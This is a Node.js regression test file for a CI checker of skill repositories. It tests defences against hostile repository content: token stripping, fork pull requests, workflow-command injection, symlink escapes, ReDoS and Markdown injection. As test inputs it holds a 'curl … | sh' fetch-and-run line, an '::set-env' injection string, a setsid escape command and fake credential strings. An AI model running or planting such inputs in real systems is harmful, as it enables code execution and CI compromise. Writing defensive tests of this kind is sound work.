// Regression tests for the security review: hostile repository content and pull-request code in CI.
import { test, after } from 'node:test'
import assert from 'node:assert/strict'
import { writeFileSync, symlinkSync, mkdirSync, existsSync, readFileSync, mkdtempSync } from 'node:fs'
import { join } from 'node:path'
import { tmpdir } from 'node:os'
import { spawnSync, execFileSync } from 'node:child_process'
import { runShell, safeEnv } from '../src/lib/exec.mjs'
import { cleanLine, cleanBlock } from '../src/lib/sanitize.mjs'
import { scanText, redactText, checkSecrets, parseAllowlist, emailAllowed } from '../src/checks/secrets.mjs'
import { lintFile } from '../src/checks/footguns.mjs'
import { relativeLinks } from '../src/lib/markdown.mjs'
import { parseYaml, YamlError } from '../src/lib/yaml.mjs'
import { loadConfig, ConfigError } from '../src/lib/config.mjs'
import { listFiles, readText, globToRegExp, GlobError } from '../src/lib/files.mjs'
import { collectOutputs, checkDemo } from '../src/checks/demo.mjs'
import { checkMedia } from '../src/checks/media.mjs'
import { runChecks } from '../src/run.mjs'
import { toMarkdown, cell, code } from '../src/report/markdown.mjs'
import { badge, annotation } from '../src/report/github.mjs'
import { untrustedEvent } from '../src/cli.mjs'
import { makeRepo, ctxFor, cleanup, CLI, FAKE } from './helpers.mjs'

after(cleanup)

const rules = (list) => list.map((f) => f.rule)
const timed = (fn) => { const t = Date.now(); const out = fn(); return { out, ms: Date.now() - t } }
const outside = () => { const d = mkdtempSync(join(tmpdir(), 'skill-ci-outside-')); writeFileSync(join(d, 'secret.txt'), `key ${FAKE.aws}\nPRIVATE-OUTSIDE-CONTENT\n`); return d }

// C1: repository commands get no tokens, no runner files and no real home
test('C1: commands see only allow-listed variables and a throwaway HOME', async () => {
  const env = { PATH: process.env.PATH, HOME: '/root-home', GITHUB_TOKEN: 'tok-123', GITHUB_ENV: '/x/env', GITHUB_PATH: '/x/path', ACTIONS_RUNTIME_TOKEN: 'rt', ACTIONS_ID_TOKEN_REQUEST_TOKEN: 'id', RUNNER_TEMP: '/rt', MY_API_TOKEN: 'mine', INPUT_SECRET: 's' }
  const r = await runShell('env', { cwd: tmpdir(), env })
  for (const k of ['GITHUB_TOKEN', 'GITHUB_ENV', 'GITHUB_PATH', 'ACTIONS_RUNTIME_TOKEN', 'ACTIONS_ID_TOKEN_REQUEST_TOKEN', 'RUNNER_TEMP', 'MY_API_TOKEN', 'INPUT_SECRET']) assert.ok(!r.output.includes(`${k}=`), k)
  assert.ok(!r.output.includes('HOME=/root-home'))
  assert.match(r.output, /HOME=.*skill-ci-home-/)
  assert.match(r.output, /^CI=true$/m)
  const e = safeEnv(env, '/tmp/h')
  assert.deepEqual(Object.keys(e).sort(), ['CI', 'HOME', 'PATH', 'SKILL_CI', 'TEMP', 'TMP', 'TMPDIR'])
})

test('C1: the clone has no origin remote pointing back at the checkout', async () => {
  const dir = makeRepo('good-skill')
  const ctx = ctxFor(dir, { test: { command: 'git remote -v; echo REMOTES-DONE' } })
  const { checkInstall, cleanupClone } = await import('../src/checks/install.mjs')
  const res = await checkInstall(ctx)
  cleanupClone(ctx)
  assert.match(res.details.test.output, /^REMOTES-DONE$/m)
  assert.ok(!res.details.test.output.includes(dir), 'the remote path leaked')
})

test('C1: the demo runs in the throwaway clone, never in the real checkout', async () => {
  const dir = makeRepo('good-skill')
  const ctx = ctxFor(dir, { demo: { command: 'echo pwned > in-checkout.txt; mkdir -p out; echo hi > out/a.txt', outputs: ['out/*.txt'] } })
  const res = await checkDemo(ctx)
  const { cleanupClone } = await import('../src/checks/install.mjs')
  cleanupClone(ctx)
  assert.ok(!existsSync(join(dir, 'in-checkout.txt')))
  assert.ok(!existsSync(join(dir, 'out', 'a.txt')))
  assert.equal(res.demoFiles.length, 1)
  assert.equal(readFileSync(res.demoFiles[0], 'utf8'), 'hi\n')
})

test('C1: fork pull requests and pull_request_target are untrusted; same-repo pull requests are not', () => {
  const dir = mkdtempSync(join(tmpdir(), 'skill-ci-event-'))
  const ev = (head, base) => { const p = join(dir, `${head.replace('/', '_')}.json`); writeFileSync(p, JSON.stringify({ pull_request: { head: { repo: { full_name: head } }, base: { repo: { full_name: base } } } })); return p }
  assert.equal(untrustedEvent({ GITHUB_EVENT_NAME: 'pull_request_target' }), 'pull_request_target event')
  assert.equal(untrustedEvent({ GITHUB_EVENT_NAME: 'pull_request', GITHUB_EVENT_PATH: ev('evil/fork', 'o/r') }), 'pull request from a fork')
  assert.equal(untrustedEvent({ GITHUB_EVENT_NAME: 'pull_request', GITHUB_EVENT_PATH: ev('o/r', 'o/r') }), null)
  assert.equal(untrustedEvent({ GITHUB_EVENT_NAME: 'push' }), null)
})

test('C1: in --github mode a fork pull request runs no repository command and locks the config', () => {
  const dir = makeRepo('good-skill', { files: { '.skill-ci.yml': 'disable: [secrets]\ndemo:\n  command: touch ran.txt\n  outputs: ["ran.txt"]\n', 'k.js': `const k = "${FAKE.aws}"\n` } })
  const out = mkdtempSync(join(tmpdir(), 'skill-ci-fork-'))
  writeFileSync(join(out, 'event.json'), JSON.stringify({ pull_request: { head: { repo: { full_name: 'evil/fork' } }, base: { repo: { full_name: 'o/good-skill' } } } }))
  for (const f of ['summary', 'output']) writeFileSync(join(out, f), '')
  const env = { ...process.env, GITHUB_EVENT_NAME: 'pull_request', GITHUB_EVENT_PATH: join(out, 'event.json'), GITHUB_REPOSITORY: 'o/good-skill', GITHUB_STEP_SUMMARY: join(out, 'summary'), GITHUB_OUTPUT: join(out, 'output') }
  const r = spawnSync(process.execPath, [CLI, 'check', dir, '--github'], { encoding: 'utf8', env })
  assert.equal(r.status, 1, r.stdout + r.stderr) // the AWS key is reported although the PR's config disabled secrets
  assert.match(r.stdout, /secrets\/aws-access-key/)
  assert.ok(!existsSync(join(dir, 'ran.txt')))
  const summary = readFileSync(join(out, 'summary'), 'utf8')
  assert.match(summary, /Untrusted run \(pull request from a fork\)/)
  assert.match(readFileSync(join(out, 'output'), 'utf8'), /^tests-run=false$/m)
})

// H1: workflow-command injection through printed text
test('H1: control characters are removed from every finding and annotation', () => {
  const evil = 'a\n::set-env name=X::y\r\x1b[31m\u202e'
  assert.ok(!/[\n\r\x1b\u202e]/.test(cleanLine(evil)))
  const line = annotation({ rule: 'x/y', level: 'error', message: evil, file: `f${evil}`, line: 1 })
  assert.equal(line.split('\n').length, 1)
  assert.ok(!line.includes('\x1b'))
  assert.equal(cleanBlock('ok\r\n\x1b[2Jnext\x07'), 'ok\nnext')
})

test('H1: in --github mode everything except annotations is printed inside stop-commands', () => {
  const dir = makeRepo('good-skill', { files: { ['evil\n::warning::injected.md']: 'x' } })
  const r = spawnSync(process.execPath, [CLI, 'check', dir, '--github', '--no-run', '--verbose'], { encoding: 'utf8', env: { ...process.env, GITHUB_EVENT_NAME: 'push' } })
  const lines = r.stdout.split('\n')
  const start = lines.findIndex((l) => l.startsWith('::stop-commands::'))
  assert.equal(start, 0)
  const token = lines[0].split('::')[2]
  assert.ok(token.length >= 32)
  const end = lines.indexOf(`::${token}::`)
  assert.ok(end > start)
  for (const l of lines.slice(end + 1)) if (l) assert.match(l, /^::(error|warning|notice) /, l)
  assert.ok(!lines.some((l) => l === '::warning::injected.md'))
})

// H2: the time limit holds even when the command escapes into the background
test('H2: a command that backgrounds a setsid process still ends at its time limit', async () => {
  const t = Date.now()
  const r = await runShell('setsid sleep 30 > /dev/null 2>&1 < /dev/null & setsid sleep 30 & sleep 30', { cwd: tmpdir(), timeoutMs: 500 })
  assert.equal(r.timedOut, true)
  assert.ok(Date.now() - t < 6000, `took ${Date.now() - t} ms`)
})

test('H2: a command that exits but leaves a background child holding the pipes still returns', async () => {
  const t = Date.now()
  const r = await runShell('(setsid sleep 30 &); echo done', { cwd: tmpdir(), timeoutMs: 20000 })
  assert.equal(r.code, 0)
  assert.match(r.output, /done/)
  assert.ok(Date.now() - t < 5000, `took ${Date.now() - t} ms`)
})

test('H2: max-runtime caps all repository commands together', async () => {
  const dir = makeRepo('good-skill', { files: { '.skill-ci.yml': 'max-runtime: 1\ntest:\n  command: sleep 20\n' } })
  const t = Date.now()
  const report = await runChecks(dir, { only: ['install'] })
  assert.ok(Date.now() - t < 8000, `took ${Date.now() - t} ms`)
  assert.match(report.checks.find((c) => c.id === 'install').findings[0].message, /did not finish within (0\.\d|1) s/)
})

// H3: no pattern costs more than linear-ish time on hostile input
test('H3: secret, email and link patterns stay fast on 2 MB of hostile text', () => {
  const inputs = ['a://' + 'b'.repeat(2e6), 'sk-' + 'A'.repeat(2e6), 'x@' + 'a.'.repeat(1e6), '['.repeat(2e6), 'Authorization: Bearer ' + 'A'.repeat(2e6), 'aaaa '.repeat(4e5)]
  for (const text of inputs) {
    const { ms } = timed(() => scanText(text, 'f'))
    assert.ok(ms < 5000, `scanText took ${ms} ms on ${text.slice(0, 12)}...`)
  }
  const { ms } = timed(() => relativeLinks('[' + 'a'.repeat(1e5) + '[x]('.repeat(1e4)))
  assert.ok(ms < 3000, `links took ${ms} ms`)
  const fg = timed(() => lintFile('curl '.repeat(4e5), 'a.sh'))
  assert.ok(fg.ms < 5000, `footguns took ${fg.ms} ms`)
})

test('H3: the YAML reader stays fast on unclosed brackets and quotes', () => {
  for (const doc of ['a: [\n' + '  b,\n'.repeat(20000), 'a: "x\n' + '  y\n'.repeat(20000)]) {
    const { ms } = timed(() => { try { parseYaml(doc) } catch {} })
    assert.ok(ms < 2000, `${ms} ms`)
  }
})

test('H3: an allowlist regex with nested repetition is refused', () => {
  const allow = parseAllowlist('/(a+)+$/\n/^ok-[a-z]{3}$/\n/' + 'a'.repeat(300) + '/\n')
  assert.equal(allow.patterns.length, 1)
  assert.equal(allow.rejected.length, 2)
})

test('H3: globs with too many wildcards are refused; collapsed ** stays linear', () => {
  assert.throws(() => globToRegExp('*a*a*a*a*a*a*a*a*a*a*a*a*a*b'), GlobError)
  const re = globToRegExp('**/**/**/x')
  const { ms } = timed(() => re.test('a/'.repeat(5000) + 'y'))
  assert.ok(ms < 500)
})

// H4: symlinks never lead outside the repository
test('H4: a symlink to a file outside the repo is not read, scanned or uploaded', async () => {
  const out = outside()
  const dir = makeRepo('good-skill')
  symlinkSync(join(out, 'secret.txt'), join(dir, 'leak.txt'))
  execFileSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@example.com', 'add', 'leak.txt'], { cwd: dir })
  execFileSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@example.com', 'commit', '-qm', 'link'], { cwd: dir })
  const list = listFiles(dir)
  assert.ok(!list.files.includes('leak.txt'))
  assert.deepEqual(list.symlinks, ['leak.txt'])
  assert.equal(readText(join(dir, 'leak.txt')).skipped, 'symlink')
  const res = checkSecrets(ctxFor(dir))
  assert.deepEqual(rules(res.findings), ['secrets/symlink'])
  const ctx = ctxFor(dir, { demo: { command: 'true', outputs: ['*.txt'] } })
  const demo = await checkDemo(ctx)
  ;(await import('../src/checks/install.mjs')).cleanupClone(ctx)
  assert.deepEqual(demo.demoFiles, [])
})

test('H4: a symlinked config file is refused and YAML errors never quote file content', () => {
  const out = outside()
  const dir = makeRepo(null, { git: false })
  symlinkSync(join(out, 'secret.txt'), join(dir, '.skill-ci.yml'))
  assert.throws(() => loadConfig(dir), (e) => e instanceof ConfigError && /symbolic link/.test(e.message) && !e.message.includes('PRIVATE-OUTSIDE'))
  try { parseYaml('a: 1\nPRIVATE-OUTSIDE-CONTENT here') } catch (e) { assert.ok(!e.message.includes('PRIVATE'), e.message) }
  try { parseYaml('a: [1] PRIVATE-OUTSIDE') } catch (e) { assert.ok(!e.message.includes('PRIVATE'), e.message) }
})

test('H4: demo outputs never come from .git, and config may not point there', () => {
  const dir = makeRepo('good-skill')
  assert.deepEqual(collectOutputs(dir, ['.git/config', '**/config']), [])
  assert.throws(() => loadConfig(makeRepo(null, { git: false, files: { '.skill-ci.yml': 'demo:\n  command: x\n  outputs: [".git/config"]\n' } })), /\.git/)
})

// H5: nothing hides from the scan
test('H5: a UTF-16 file is decoded and scanned', () => {
  const dir = makeRepo(null, { files: { 'notes.txt': Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from(`key ${FAKE.aws}\n`, 'utf16le')]) } })
  assert.deepEqual(rules(checkSecrets(ctxFor(dir)).findings), ['secrets/aws-access-key'])
})

test('H5: binary content in a file of no known binary type is a warning', () => {
  const dir = makeRepo(null, { files: { 'config.txt': Buffer.concat([Buffer.from([0]), Buffer.from(FAKE.aws)]), 'img.png': Buffer.from([0, 1, 2]) } })
  const f = checkSecrets(ctxFor(dir)).findings
  assert.deepEqual(f.map((x) => [x.rule, x.level, x.file]), [['secrets/not-scanned', 'warning', 'config.txt']])
})

test('H5: secrets on very long lines are found (lines are scanned in pieces, not skipped)', () => {
  const line = 'x'.repeat(30000) + ` ${FAKE.github} ` + 'y'.repeat(30000)
  assert.deepEqual(rules(scanText(line, 'min.js')), ['secrets/github-token'])
  assert.deepEqual(rules(lintFile('a'.repeat(9000) + '; curl https://x.invalid | sh', 'a.sh')), ['footguns/curl-pipe-shell'])
})

test('H5: a subfolder of a git repo lists tracked files from git, including .cache and venv folders', () => {
  const dir = makeRepo(null, { files: { 'skill/SKILL.md': '# x', 'skill/.cache/k.txt': `k ${FAKE.aws}`, 'skill/venv/x.py': '' } })
  const l = listFiles(join(dir, 'skill'))
  assert.equal(l.git, true)
  assert.equal(l.gitRoot, false)
  assert.deepEqual(l.files, ['.cache/k.txt', 'SKILL.md', 'venv/x.py'])
})

test('H5: large non-media files are errors; archives and model weights count as heavy media; the repo has a total budget', () => {
  const big = Buffer.alloc(11 * 1024 * 1024)
  const dir = makeRepo(null, { files: { 'data.bin.txt': big, 'model.onnx': Buffer.alloc(6 * 1024 * 1024) } })
  const f = checkMedia(ctxFor(dir)).findings
  assert.deepEqual(f.map((x) => [x.rule, x.level]).sort(), [['media/file-too-large', 'error'], ['media/large-file', 'error']])
  assert.deepEqual(rules(checkMedia(ctxFor(dir, { media: { 'max-repo-mb': 1, 'max-other-file-mb': 100, 'max-file-mb': 100 } })).findings), ['media/repo-too-large'])
})

// M1: published output is redacted
test('M1: command output is redacted before it reaches the report', async () => {
  const text = `token ${FAKE.github} mail ${FAKE.email} key "${FAKE.aws}"`
  const red = redactText(text)
  for (const v of [FAKE.github, FAKE.email, FAKE.aws]) assert.ok(!red.includes(v))
  const dir = makeRepo('good-skill')
  const ctx = ctxFor(dir, { test: { command: `echo leaked ${FAKE.github}` } })
  const { checkInstall, cleanupClone } = await import('../src/checks/install.mjs')
  const res = await checkInstall(ctx)
  cleanupClone(ctx)
  assert.ok(!res.details.test.output.includes(FAKE.github))
  assert.match(res.details.test.output, /\[redacted GitHub token\]/)
})

test('M1: the summary stays under 1 MB', () => {
  const findings = Array.from({ length: 5000 }, (_, i) => ({ rule: 'secrets/email', level: 'error', message: 'm'.repeat(800), file: `f${i}` }))
  const md = toMarkdown({ name: 'x', version: '0', result: 'fail', failOn: 'error', durationMs: 1, totals: { errors: 5000, warnings: 0, notices: 0 }, checks: [{ id: 'secrets', title: 'S', status: 'fail', note: '', findings, details: { test: { command: 'c', code: 1, seconds: 1, output: 'o\n'.repeat(400000) } } }] })
  assert.ok(Buffer.byteLength(md) <= 1000 * 1000)
})

// M2: Markdown injection
test('M2: file names and values cannot add links, images or HTML to the summary', () => {
  assert.equal(cell('see [x](https://evil.example) ![i](y) <img>'), 'see \\[x\\]\\(https://evil.example\\) \\!\\[i\\]\\(y\\) &lt;img&gt;')
  assert.equal(code('a`b[x](y)'), 'a\\`b\\[x\\]\\(y\\)')
  assert.equal(code('plain|x'), '`plain\\|x`')
  const md = toMarkdown({ name: 'n`[x](y)', version: '0', result: 'fail', failOn: 'error', durationMs: 1, totals: { errors: 1, warnings: 0, notices: 0 }, checks: [{ id: 'x', title: 'X', status: 'fail', note: '', findings: [{ rule: 'x/y', level: 'error', message: 'm', file: '[evil](https://e.example)' }] }] })
  const outsideCode = md.replace(/`[^`\n]*`/g, '')
  assert.ok(!/(?<!\\)\[evil\]\(/.test(outsideCode))
  assert.ok(!/(?<!\\)\[x\]\(y\)/.test(outsideCode))
})

// M3: a pull request cannot silence findings when the config is locked
test('M3: lock-config ignores disable, ignore, allowlists and inline allow comments', async () => {
  const dir = makeRepo('good-skill', { files: { '.skill-ci.yml': 'disable: [secrets]\nignore: ["k*.js"]\nfail-on: never\n', '.skill-ci-allow': `${FAKE.aws}\n`, 'k.js': `const k = "${FAKE.aws}"\n`, 'k2.js': `const g = "${FAKE.github}" // skill-ci: allow\n` } })
  const open = await runChecks(dir, { run: false })
  assert.equal(open.totals.errors, 0)
  const locked = await runChecks(dir, { run: false, lockConfig: true })
  const got = locked.checks.flatMap((c) => c.findings).map((f) => f.rule)
  assert.ok(got.includes('secrets/aws-access-key') && got.includes('secrets/github-token'))
  assert.equal(locked.failOn, 'error')
})

// M4: more key formats, fewer false positives
test('M4: newer and legacy key formats are found', () => {
  const k = {
    'openai-key': 'sk-' + 'A1b2C3d4E5'.repeat(4) + 'F6g7H8i9',
    'openrouter-key': 'sk-or-v1-' + 'ab12'.repeat(16),
    'groq-key': 'gsk_' + 'Ab1'.repeat(17) + 'C',
    'gitlab-token': 'glpat-' + 'Ab12Cd34Ef56Gh78Ij90',
    'sendgrid-key': 'SG.' + 'A'.repeat(21) + 'b.' + 'C'.repeat(42) + 'd',
    'twilio-key': 'SK' + '0123456789abcdef'.repeat(2),
    'telegram-bot-token': '123456789:AA' + 'B'.repeat(32) + 'c',
    'pypi-token': 'pypi-AgEIcHlwaS5vcmc' + 'Q'.repeat(60),
    'digitalocean-token': 'dop_v1_' + 'a1'.repeat(32),
    'azure-storage-key': 'AccountKey=' + 'Zm9v'.repeat(15) + '==',
    'aws-secret-key': 'aws_secret_access_key = ' + 'wJalrXUtnFEMIK7MDENGbPxRfiCY1234567890AB',
    'bearer-token': 'Authorization: Bearer ' + 'eyZ0a1b2c3d4e5f6g7h8i9j0',
    'npm-auth-token': '//registry.npmjs.org/:_auth' + 'Token=' + 'Nm9a8B7c6D5e4F3g',
    'stripe-test-key': 'sk_' + 'test_' + 'Zz1'.repeat(8),
  }
  for (const [id, v] of Object.entries(k)) assert.ok(rules(scanText(v, 'f')).includes(`secrets/${id}`), id)
})

test('M4: unquoted credential assignments, PEM bodies and non-ASCII emails; versions are not emails', () => {
  assert.ok(rules(scanText('API_KEY=Zx81Hq20Lm55Kp9', '.env.example')).includes('secrets/hardcoded-credential'))
  assert.ok(rules(scanText('password: Tr0ub4dor3xyzQ', 'c.yml')).includes('secrets/hardcoded-credential'))
  assert.deepEqual(rules(scanText('password: getPassword()', 'c.py')), [])
  const body = Array.from({ length: 6 }, () => 'MIIEv'.padEnd(64, 'Q')).join('\n')
  assert.deepEqual(rules(scanText(body, 'k.txt')), ['secrets/key-body'])
  assert.deepEqual(rules(scanText('mail ' + 'jürgen.' + 'müller' + '@' + 'beispiel-post.de', 'f')), ['secrets/email'])
  assert.ok(emailAllowed('foo@v1.2.3.beta'))
  assert.deepEqual(scanText('npm i foo@v1.2.3.beta', 'f'), [])
})

// M5: skipped tests are visible
test('M5: when the fresh-clone test does not run, the summary and badge say so', async () => {
  const report = await runChecks(makeRepo('good-skill', { git: false }))
  assert.equal(report.testsNotRun, true)
  assert.match(toMarkdown(report), /^## skill-ci: `good-skill` passed with warnings \(fresh-clone test not run\)/)
  const noRun = await runChecks(makeRepo('good-skill'), { run: false })
  assert.equal(noRun.testsNotRun, true)
  assert.match(toMarkdown(noRun), /^## skill-ci: `good-skill` passed \(fresh-clone test not run\)/)
  assert.equal(badge(noRun).message, 'passing, tests not run')
  const ran = await runChecks(makeRepo('good-skill'))
  assert.equal(ran.testsNotRun, false)
  assert.equal(badge(ran).message, 'passing')
})

// LOW
test('LOW: deep nesting, prototype keys and oversized configs exit cleanly with code 2', () => {
  assert.throws(() => parseYaml('a: ' + '['.repeat(200) + ']'.repeat(200)), /nested deeper/)
  assert.throws(() => parseYaml('__proto__:\n  x: 1'), YamlError)
  assert.throws(() => parseYaml('a: {constructor: 1}'), YamlError)
  const deep = makeRepo('good-skill', { files: { '.skill-ci.yml': Array.from({ length: 100 }, (_, i) => ' '.repeat(i * 2) + `k${i}:`).join('\n') + '\n' } })
  const r = spawnSync(process.execPath, [CLI, 'check', deep, '--no-run'], { encoding: 'utf8' })
  assert.equal(r.status, 2)
  assert.match(r.stderr, /nested deeper/)
  const huge = makeRepo('good-skill', { files: { '.skill-ci.yml': '# ' + 'x'.repeat(70 * 1024) + '\n' } })
  const r2 = spawnSync(process.execPath, [CLI, 'check', huge, '--no-run'], { encoding: 'utf8' })
  assert.equal(r2.status, 2)
  assert.match(r2.stderr, /over 64 KB/)
})

test('LOW: demo output files with a line break in their name are not passed on', () => {
  const dir = makeRepo(null, { git: false, files: { 'out/ok.txt': 'a', ['out/bad\nname.txt']: 'b' } })
  const skipped = []
  const files = collectOutputs(dir, ['out/*'], { skipped })
  assert.deepEqual(files.map((f) => f.file), ['out/ok.txt'])
  assert.equal(skipped.length, 1)
})

test('LOW: a symlinked directory is not walked for demo outputs', () => {
  const out = outside()
  const dir = makeRepo(null, { git: false, files: { 'out/ok.txt': 'a' } })
  mkdirSync(join(dir, 'out2'))
  symlinkSync(out, join(dir, 'out2', 'escape'))
  assert.deepEqual(collectOutputs(dir, ['**/*.txt']).map((f) => f.file), ['out/ok.txt'])
})
